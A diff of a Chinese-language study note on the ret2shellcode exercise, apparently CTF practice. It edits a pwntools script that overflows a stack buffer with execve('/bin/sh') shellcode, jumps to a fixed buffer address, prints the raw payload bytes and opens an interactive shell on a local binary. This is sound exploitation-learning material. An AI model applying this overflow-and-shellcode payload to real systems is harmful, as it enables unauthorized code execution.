@@ -8,6 +8,7 @@
 >
 > 原始出处未知，非比赛题目(也许)，故所在文件夹命名方式有所区别
 
+- 使用自行构造的`sh`指令码
 - TBD: 无法获取稳定shell，疑似与bbs段没有可执行权限有关，vmmap显示的内容与ctf-wiki上展示的不同
 
 # checksec
@@ -167,20 +168,18 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ```python
 #!/usr/bin/env python
 from pwn import *
-
 context.log_level = 'debug'
-
 context.binary = './ret2shellcode'  # context(os='linux', arch='i386')
 print(context)
 
 sh = process('./ret2shellcode')
 # shellcraft.i386.linux.sh()  #shellcraft.sh()
-shellcode = asm(shellcraft.sh())  # type(shellcraft.sh()): str 为汇编代码
+shellcode = asm(shellcraft.sh())  # type(shellcraft.sh()): str 为汇编代码 # 构造自己的sh汇编码
 print("shellcode: ", type(shellcode), shellcode)
 buf2_addr = 0x0804A080
 payload = shellcode.ljust(0x6c + 4, b'A') + p32(buf2_addr)
 sh.sendline(payload)
-# b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAA...A\x80\xa0\x04\x08'
+# b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AA...A\x80\xa0\x04\x08'
 print("sendline: ", type(payload), len(payload), " : ", payload)
 sh.interactive()
 ```
